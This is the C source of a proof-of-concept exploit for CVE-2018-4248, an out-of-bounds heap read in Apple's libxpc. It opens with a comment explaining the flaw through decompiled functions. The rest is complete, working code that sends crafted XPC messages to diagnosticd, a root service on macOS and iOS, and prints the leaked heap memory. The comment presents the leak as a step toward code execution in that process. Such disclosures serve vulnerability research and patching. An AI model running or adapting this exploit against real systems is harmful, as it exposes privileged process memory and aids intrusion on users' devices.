/*
 * xpc-string-leak
 * Brandon Azad
 *
 * CVE-2018-4248
 *
 *
 * xpc-string-leak is a proof-of-concept exploit for an out-of-bounds memory read in libxpc. This
 * exploit uses the vulnerability to read out-of-bounds heap memory from diagnosticd, an
 * unsandboxed root process with the task_for_pid-allow entitlement.
 *
 *
 * The vulnerability
 * ------------------------------------------------------------------------------------------------
 *
 * On macOS 10.13.5 and iOS 11.4, the function _xpc_string_deserialize() does not verify that the
 * deserialized string is of the proper length before creating an XPC string object with
 * _xpc_string_create(). This can lead to a heartbleed-style out-of-bounds heap read if the XPC
 * string is then serialized into another XPC message.
 *
 * Here is the implementation of _xpc_string_deserialize(), decompiled using IDA:
 *
 * 	OS_xpc_string *__fastcall _xpc_string_deserialize(OS_xpc_serializer *xserializer)
 * 	{
 * 	    OS_xpc_string *xstring; // rbx@1
 * 	    char *string; // rax@4
 * 	    char *contents; // [rsp+8h] [rbp-18h]@1
 * 	    size_t size; // [rsp+10h] [rbp-10h]@1 MAPDST
 *
 * 	    xstring = 0LL;
 * 	    contents = 0LL;
 * 	    size = 0LL;
 * 	    if ( _xpc_string_get_wire_value(xserializer, (const char **)&contents, &size) )
 * 	    {
 * 	        if ( contents[size - 1] || (string = _xpc_try_strdup(contents)) == 0LL )
 * 	        {
 * 	            xstring = 0LL;
 * 	        }
 * 	        else
 * 	        {
 * 	            xstring = _xpc_string_create(string, size - 1);
 * 	            LOBYTE(xstring->flags) |= 1u;
 * 	        }
 * 	    }
 * 	    return xstring;
 * 	}
 *
 * _xpc_string_deserialize() first calls _xpc_string_get_wire_value() to retrieve a pointer to the
 * string data as well as the serialized size of the string, as reported by the string header.
 * _xpc_string_deserialize() then checks that the string has a null terminator at the end of its
 * reported size, but crucially does not check that there is no null terminator earlier in the
 * data. Finally, it creates a copy of the string on the heap and creates the OS_xpc_string object
 * using _xpc_string_create().
 *
 * Here is the decompiled code for _xpc_string_create():
 *
 * 	OS_xpc_string *__fastcall _xpc_string_create(const char *string, size_t length)
 * 	{
 * 	    OS_xpc_string *xstring; // rax@1
 *
 * 	    xstring = (OS_xpc_string *)_xpc_base_create(&OBJC_CLASS___OS_xpc_string, 16LL);
 * 	    if ( (((_DWORD)length + 4) & 0xFFFFFFFC) + 4 < length )
 * 	        _xpc_api_misuse("Unreasonably large string");
 * 	    xstring->wire_length = ((length + 4) & 0xFFFFFFFC) + 4;
 * 	    xstring->string = string;
 * 	    xstring->length = length;
 * 	    return xstring;
 * 	}
 *
 * _xpc_string_create() trusts the value of length supplied by _xpc_string_deserialize() and sets
 * the appropriate fields in the OS_xpc_string object. At this point, the deserialized string may
 * have a length field that is larger than the allocated string data.
 *
 *
 * Exploitation
 * ---------------------------------------------------------------------------------------------------
 *
 * Theoretically, this could be used to trigger memory corruption in services that get the length of
 * the string using xpc_string_get_length(), but this pattern seems to be uncommon. A less powerful
 * but more practical exploit strategy is to get the string to be re-serialized and sent back to us,
 * giving us a heartbleed-style window into the victim process's memory.
 *
 * This is the implementation of _xpc_string_serialize():
 *
 * 	void __fastcall _xpc_string_serialize(OS_xpc_string *string, OS_xpc_serializer *serializer)
 * 	{
 * 	    int type; // [rsp+8h] [rbp-18h]@1
 * 	    int size; // [rsp+Ch] [rbp-14h]@1
 *
 * 	    type = *((_DWORD *)&OBJC_CLASS___OS_xpc_string + 10);
 * 	    _xpc_serializer_append(serializer, &type, 4uLL, 1, 0, 0);
 * 	    size = LODWORD(string->length) + 1;
 * 	    _xpc_serializer_append(serializer, &size, 4uLL, 1, 0, 0);
 * 	    _xpc_serializer_append(serializer, string->string, string->length + 1, 1, 0, 0);
 * 	}
 *
 * The OS_xpc_string's length parameter is trusted during serialization, meaning that many bytes
 * are read from the heap into the serialized message. If the deserialized string was shorter than
 * its reported length, the message will be filled with out-of-bounds heap data.
 *
 * We're still limited to exploiting XPC services that reflect some part of the XPC message back to
 * the client, but this is much more common. For example, on macOS and iOS, diagnosticd is a
 * promising candidate that also happens to be unsandboxed, root, and has task_for_pid privileges.
 * Diagnosticd is responsible for processing diagnostic messages (for example, messages generated
 * by os_log()) and streaming them to clients interested in receiving these messages. By
 * registering to receive our own diagnostic stream and then sending a diagnostic message with a
 * shorter than expected string, we can obtain a snapshot of some of the data in diagnosticd's
 * heap, which can aid in getting code execution in the process.
 *
 */

#include <assert.h>
#include <bootstrap.h>
#include <mach/mach.h>
#include <stdbool.h>
#include <stddef.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

// ---- Logging -----------------------------------------------------------------------------------

#define DEBUG_LEVEL(_level)	(DEBUG && _level <= DEBUG)
#if DEBUG
#define DEBUG_TRACE(_level, _fmt, ...)					\
	do {								\
		if (DEBUG_LEVEL(_level)) {				\
			printf("Debug: "_fmt"\n", ##__VA_ARGS__);	\
		}							\
	} while (0)
#else
#define DEBUG_TRACE(_level, _fmt, ...)	do {} while (0)
#endif
#define INFO(_fmt, ...)		printf("Info: "_fmt"\n", ##__VA_ARGS__)
#define WARNING(_fmt, ...)	printf("Warning: "_fmt"\n", ##__VA_ARGS__)
#define ERROR(_fmt, ...)	printf("Error: "_fmt"\n", ##__VA_ARGS__)

// ---- XPC types ---------------------------------------------------------------------------------

enum {
	XPC_CONNECT_MSGH_ID = 0x77303074,
	XPC_MSGH_ID         = 0x10000000,
	XPC_MAGIC           = 0x40585043,
	XPC_VERSION         = 5,
	XPC_INT64_ID        = 0x3000,
	XPC_UINT64_ID       = 0x4000,
	XPC_STRING_ID       = 0x9000,
	XPC_ARRAY_ID        = 0xe000,
	XPC_DICTIONARY_ID   = 0xf000,
};

struct __attribute__((packed)) xpc_int64 {
	uint32_t id;		// 0x3000
	int64_t value;
};

struct __attribute__((packed)) xpc_uint64 {
	uint32_t id;		// 0x4000
	uint64_t value;
};

struct __attribute__((packed)) xpc_string_header {
	uint32_t id;		// 0x9000
	uint32_t size;		// serialized size in bytes
};

struct __attribute__((packed)) xpc_array_header {
	uint32_t id;		// 0xe000
	uint32_t size;		// serialized size in bytes after this field
	uint32_t count;		// number of key/value pairs
};

struct __attribute__((packed)) xpc_dictionary_header {
	uint32_t id;		// 0xf000
	uint32_t size;		// serialized size in bytes after this field
	uint32_t count;		// number of key/value pairs
};

// ---- XPC connections ---------------------------------------------------------------------------

// Look up the specified Mach service in launchd.
static mach_port_t
launchd_lookup_service(const char *endpoint) {
	mach_port_t service_port;
	kern_return_t kr = bootstrap_look_up(bootstrap_port, endpoint, &service_port);
	if (kr != KERN_SUCCESS) {
		ERROR("%s(%s): %u", "bootstrap_look_up", endpoint, kr);
		return MACH_PORT_NULL;
	}
	if (!MACH_PORT_VALID(service_port)) {
		ERROR("%s(%s): %s", "bootstrap_look_up", endpoint, (service_port == MACH_PORT_NULL
					? "MACH_PORT_NULL" : "MACH_PORT_DEAD"));
		return MACH_PORT_NULL;
	}
	return service_port;
}

// Connect to the XPC service at the specified service port.
static bool
xpc_connect(mach_port_t service_port, mach_port_t *server_port, mach_port_t *client_port) {
	// Create the server port. Add a send right so we can send to it later.
	mach_port_t server;
	mach_port_options_t options = { .flags = MPO_INSERT_SEND_RIGHT };
	kern_return_t kr = mach_port_construct(mach_task_self(), &options, 0, &server);
	assert(kr == KERN_SUCCESS);
	// Create the client port. No send right for this one.
	mach_port_t client;
	options.flags = 0;
	kr = mach_port_construct(mach_task_self(), &options, 0, &client);
	assert(kr == KERN_SUCCESS);
	// Create the XPC w00t message.
	struct xpc_w00t {
		mach_msg_header_t hdr;
		mach_msg_body_t body;
		mach_msg_port_descriptor_t server;
		mach_msg_port_descriptor_t client;
	};
	struct xpc_w00t w00t = {};
	w00t.hdr.msgh_bits              = MACH_MSGH_BITS_SET(MACH_MSG_TYPE_COPY_SEND, 0, 0, MACH_MSGH_BITS_COMPLEX);
	w00t.hdr.msgh_size              = sizeof(w00t);
	w00t.hdr.msgh_remote_port       = service_port;
	w00t.hdr.msgh_id                = XPC_CONNECT_MSGH_ID;
	w00t.body.msgh_descriptor_count = 2;
	w00t.server.name                = server;
	w00t.server.disposition         = MACH_MSG_TYPE_MOVE_RECEIVE;
	w00t.server.type                = MACH_MSG_PORT_DESCRIPTOR;
	w00t.client.name                = client;
	w00t.client.disposition         = MACH_MSG_TYPE_MAKE_SEND;
	w00t.client.type                = MACH_MSG_PORT_DESCRIPTOR;
	// Send the XPC w00t message.
	kr = mach_msg(&w00t.hdr,
			MACH_SEND_MSG,
			w00t.hdr.msgh_size,
			0,
			MACH_PORT_NULL,
			MACH_MSG_TIMEOUT_NONE,
			MACH_PORT_NULL);
	if (kr != KERN_SUCCESS) {
		ERROR("%s(%s): %u", "mach_msg", "w00t", kr);
		mach_port_destroy(mach_task_self(), server);
		mach_port_destroy(mach_task_self(), client);
		return false;
	}
	*server_port = server;
	*client_port = client;
	return true;
}

// Get the contents of an XPC message.
void *
xpc_message_get_content(mach_msg_header_t *msg, size_t *size) {
	if (msg->msgh_size < sizeof(*msg)) {
		return NULL;
	}
	if (msg->msgh_id != XPC_MSGH_ID) {
		return NULL;
	}
	if (MACH_MSGH_BITS_IS_COMPLEX(msg->msgh_bits)) {
		mach_msg_body_t *body = (mach_msg_body_t *)(msg + 1);
		if (body->msgh_descriptor_count != 1) {
			return NULL;
		}
		mach_msg_ool_descriptor_t *ool = (mach_msg_ool_descriptor_t *)(body + 1);
		if (ool->type != MACH_MSG_OOL_DESCRIPTOR) {
			return NULL;
		}
		*size = ool->size;
		return ool->address;
	} else {
		*size = msg->msgh_size - sizeof(*msg);
		return (msg + 1);
	}
}

// ---- The exploit against diagnosticd -----------------------------------------------------------

// The diagnosticd service name.
#define DIAGNOSTICD_SERVICE	"com.apple.diagnosticd"

// A callback block that will be called each time data is leaked from diagnosticd.
typedef void (^diagnosticd_leak_callback_block)(const void *leak_data, size_t leak_size);

// Register the XPC connection to receive our own diagnostic stream.
static bool
diagnosticd_stream_self(mach_port_t server_port) {
	// Build the stream message.
	struct msg {
		mach_msg_header_t hdr;
		uint32_t xpc;		// '@XPC'
		uint32_t version;	// 5
		struct {
			struct xpc_dictionary_header hdr;
			struct {
				char key[8];			// "action"
				struct xpc_uint64 value;	// 3
			} action;
			struct {
				char key[8];			// "flags"
				struct xpc_uint64 value;	// 0
			} flags;
			struct {
				char key[8];			// "types"
				struct xpc_uint64 value;	// 0x7
			} types;
			struct {
				char key[8];			// "pids"
				struct {
					struct xpc_array_header hdr;
					struct xpc_int64 pid;	// our pid
				} value;
			} pids;
		} dict;
	};
	struct msg *msg = calloc(1, sizeof(*msg));
	msg->hdr.msgh_bits             = MACH_MSGH_BITS_SET(MACH_MSG_TYPE_COPY_SEND, 0, 0, 0);
	msg->hdr.msgh_size             = sizeof(*msg);
	msg->hdr.msgh_remote_port      = server_port;
	msg->hdr.msgh_local_port       = MACH_PORT_NULL;
	msg->hdr.msgh_voucher_port     = MACH_PORT_NULL;
	msg->hdr.msgh_id               = XPC_MSGH_ID;
	msg->xpc                       = XPC_MAGIC;
	msg->version                   = XPC_VERSION;
	msg->dict.hdr.id               = XPC_DICTIONARY_ID;
	msg->dict.hdr.size             = sizeof(msg->dict) - offsetof(struct xpc_dictionary_header, count);
	msg->dict.hdr.count            = 4;
	strcpy(msg->dict.action.key, "action");
	msg->dict.action.value.id      = XPC_UINT64_ID;
	msg->dict.action.value.value   = 3;
	strcpy(msg->dict.flags.key, "flags");
	msg->dict.flags.value.id       = XPC_UINT64_ID;
	msg->dict.flags.value.value    = 0;
	strcpy(msg->dict.types.key, "types");
	msg->dict.types.value.id       = XPC_UINT64_ID;
	msg->dict.types.value.value    = 0x7;
	strcpy(msg->dict.pids.key, "pids");
	msg->dict.pids.value.hdr.id    = XPC_ARRAY_ID;
	msg->dict.pids.value.hdr.size  = sizeof(msg->dict.pids.value) - offsetof(struct xpc_array_header, count);
	msg->dict.pids.value.hdr.count = 1;
	msg->dict.pids.value.pid.id    = XPC_INT64_ID;
	msg->dict.pids.value.pid.value = getpid();
	// Send the stream message.
	kern_return_t kr = mach_msg(&msg->hdr,
			MACH_SEND_MSG,
			msg->hdr.msgh_size,
			0,
			MACH_PORT_NULL,
			MACH_MSG_TIMEOUT_NONE,
			MACH_PORT_NULL);
	free(msg);
	if (kr != KERN_SUCCESS) {
		ERROR("Could not send stream message to %s: 0x%x", DIAGNOSTICD_SERVICE, kr);
		return false;
	}
	return true;
}

// Send a diagnostic message to diagnosticd that will trigger the out-of-bounds heap read when
// diagnosticd sends the message on our stream.
static bool
diagnosticd_send_leak_message(mach_port_t service_port, size_t leak_size) {
	assert(leak_size >= 16 && (leak_size & 0x3) == 0);
	bool success = false;
	// Connect to diagnosticd.
	mach_port_t server_port, client_port;
	bool ok = xpc_connect(service_port, &server_port, &client_port);
	if (!ok) {
		ERROR("Could not connect to %s", DIAGNOSTICD_SERVICE);
		goto fail_0;
	}
	// Build the leak message.
	struct msg {
		mach_msg_header_t hdr;
		uint32_t xpc;		// '@XPC'
		uint32_t version;	// 5
		struct {
			struct xpc_dictionary_header hdr;
			struct {
				char key[8];			// "action"
				struct xpc_uint64 value;	// 6
			} action;
			struct {
				char key[8];			// "traceid"
				struct xpc_uint64 value;	// some trace id
			} traceid;
			struct {
				char key[8];			// "name"
				struct {
					struct xpc_string_header hdr;
					char contents[0];	// OOB read data
				} value;
			} name;
		} dict;
	};
	size_t msg_size = sizeof(struct msg) + leak_size;
	struct msg *msg = calloc(1, msg_size);
	msg->hdr.msgh_bits            = MACH_MSGH_BITS_SET(MACH_MSG_TYPE_COPY_SEND, 0, 0, 0);
	msg->hdr.msgh_size            = msg_size;
	msg->hdr.msgh_remote_port     = server_port;
	msg->hdr.msgh_local_port      = MACH_PORT_NULL;
	msg->hdr.msgh_voucher_port    = MACH_PORT_NULL;
	msg->hdr.msgh_id              = XPC_MSGH_ID;
	msg->xpc                      = XPC_MAGIC;
	msg->version                  = XPC_VERSION;
	msg->dict.hdr.id              = XPC_DICTIONARY_ID;
	msg->dict.hdr.size            = sizeof(msg->dict) + leak_size - offsetof(struct xpc_dictionary_header, count);
	msg->dict.hdr.count           = 3;
	strcpy(msg->dict.action.key, "action");
	msg->dict.action.value.id     = XPC_UINT64_ID;
	msg->dict.action.value.value  = 6;
	strcpy(msg->dict.traceid.key, "traceid");
	msg->dict.traceid.value.id    = XPC_UINT64_ID;
	msg->dict.traceid.value.value = 0x4142412000040004;
	strcpy(msg->dict.name.key, "name");
	msg->dict.name.value.hdr.id   = XPC_STRING_ID;
	msg->dict.name.value.hdr.size = sizeof(msg->dict.name.value.contents) + leak_size;
	// Send the leak message.
	kern_return_t kr = mach_msg(&msg->hdr,
			MACH_SEND_MSG,
			msg->hdr.msgh_size,
			0,
			MACH_PORT_NULL,
			MACH_MSG_TIMEOUT_NONE,
			MACH_PORT_NULL);
	free(msg);
	if (kr != KERN_SUCCESS) {
		ERROR("Could not send leak message to %s: 0x%x", DIAGNOSTICD_SERVICE, kr);
		goto fail_1;
	}
	success = true;
fail_1:
	mach_port_deallocate(mach_task_self(), server_port);
	mach_port_destroy(mach_task_self(), client_port);
fail_0:
	return success;
}

// Extract the out-of-bounds leaked data from the message we received from diagnosticd.
static bool
diagnosticd_recover_oob_heap_read_from_message(mach_msg_header_t *msg,
		diagnosticd_leak_callback_block callback) {
	// Get the XPC data from the message.
	size_t xpc_size;
	void *xpc_data = xpc_message_get_content(msg, &xpc_size);
	if (xpc_data == NULL) {
		ERROR("Could not get XPC data from message");
		return false;
	}
	// Build the signature to find the XPC string.
	const struct __attribute__((packed)) {
		char name_key[8];
		uint32_t string_id;
	} signature = { .name_key = "name", .string_id = XPC_STRING_ID };
	const size_t signature_to_string_hdr_offset = offsetof(typeof(signature), string_id);
	// Check if the XPC data contains the signature.
	uint8_t *found = memmem(xpc_data, xpc_size, &signature, sizeof(signature));
	if (found == NULL) {
		ERROR("Could not find string signature in recovered leak message");
		return false;
	}
	// Verify the string.
	size_t xpc_string_size = xpc_size - (found - (uint8_t *)xpc_data) - signature_to_string_hdr_offset;
	struct xpc_string_header *string_hdr = (void *)(found + signature_to_string_hdr_offset);
	if (string_hdr->size > xpc_string_size) {
		ERROR("Invalid string size in recovered leak message");
		return false;
	}
	// Return the leaked contents.
	void *leak_data = string_hdr + 1;
	size_t leak_size = string_hdr->size;
	callback(leak_data, leak_size);
	return true;
}

// Recover the out-of-bounds heap data from the diagnosticd stream.
static bool
diagnosticd_recover_oob_heap_read(mach_port_t client_port, size_t leak_size,
		diagnosticd_leak_callback_block callback) {
	// Create a buffer to receive the message.
	size_t msg_size = 0x1000;
	uint8_t msg_buffer[msg_size];
	mach_msg_header_t *msg_alloc = NULL;
	mach_msg_header_t *msg = (mach_msg_header_t *)msg_buffer;
	// Loop until we receive the message.
	bool success = false;
	do {
		// Receive a message.
		kern_return_t kr = mach_msg(msg,
				MACH_RCV_MSG | MACH_RCV_LARGE | MACH_RCV_TIMEOUT,
				0,
				msg_size,
				client_port,
				2000,
				MACH_PORT_NULL);
		// If we didn't have enough space, allocate some more.
		if (kr == MACH_RCV_TOO_LARGE) {
			size_t new_size = msg->msgh_size + MAX_TRAILER_SIZE;
			assert(new_size > msg_size);
			msg_alloc = realloc(msg_alloc, new_size);
			assert(msg_alloc != NULL);
			msg = msg_alloc;
			msg_size = new_size;
			kr = mach_msg(msg,
					MACH_RCV_MSG,
					0,
					msg_size,
					client_port,
					MACH_MSG_TIMEOUT_NONE,
					MACH_PORT_NULL);
		}
		// Handle any errors getting the message.
		if (kr != KERN_SUCCESS) {
			if (kr == MACH_RCV_TIMED_OUT) {
				ERROR("Timed out while waiting for leak message");
			} else {
				ERROR("Could not receive message: 0x%x", kr);
			}
			break;
		}
		// Search for the out-of-bounds data.
		success = diagnosticd_recover_oob_heap_read_from_message(msg, callback);
		// Dispose of the message and try the next one.
		mach_msg_destroy(msg);
	} while (!success);
	// Free the buffer if we used it.
	free(msg_alloc);
	return success;
}

// Perform an out-of-bounds heap read in diagnosticd of the specified size.
static bool
diagnosticd_oob_heap_read(size_t leak_size, diagnosticd_leak_callback_block callback) {
	bool success = false;
	// Look up diagnosticd.
	mach_port_t service_port = launchd_lookup_service(DIAGNOSTICD_SERVICE);
	if (service_port == MACH_PORT_NULL) {
		ERROR("Could not look up %s", DIAGNOSTICD_SERVICE);
		goto fail_0;
	}
	// Connect to diagnosticd.
	mach_port_t server_port, client_port;
	bool ok = xpc_connect(service_port, &server_port, &client_port);
	if (!ok) {
		ERROR("Could not connect to %s", DIAGNOSTICD_SERVICE);
		goto fail_1;
	}
	// Subscribe the client_port to a stream for our own process.
	ok = diagnosticd_stream_self(server_port);
	if (!ok) {
		goto fail_2;
	}
	// Now trigger the out-of-bounds read by sending a message with a malformed string.
	ok = diagnosticd_send_leak_message(service_port, leak_size);
	if (!ok) {
		goto fail_2;
	}
	// Finally listen for the reply containing the out-of-bounds heap data from diagnosticd.
	ok = diagnosticd_recover_oob_heap_read(client_port, leak_size, callback);
	if (!ok) {
		goto fail_2;
	}
	success = true;
fail_2:
	mach_port_deallocate(mach_task_self(), server_port);
	mach_port_destroy(mach_task_self(), client_port);
fail_1:
	mach_port_deallocate(mach_task_self(), service_port);
fail_0:
	return success;
}

int
main(int argc, const char *argv[]) {
	// Parse arguments.
	if (argc != 2) {
		return 1;
	}
	char *end;
	size_t leak_size = strtoull(argv[1], &end, 0);
	if (*end != 0) {
		return 1;
	}
	if (leak_size < 16 || leak_size % 8 != 0) {
		return 1;
	}
	// Run the exploit.
	bool success = diagnosticd_oob_heap_read(leak_size,
			^(const void *leak_data, size_t leak_size) {
		// Print the leaked data.
		size_t end = leak_size / 8;
		for (size_t i = 0; i < end; i++) {
			bool newline = (i % 2) == 1 || i + 1 >= end;
			printf("0x%016llx%c", ((uint64_t *)leak_data)[i], (newline ? '\n' : ' '));
		}
	});
	return (success ? 0 : 1);
}
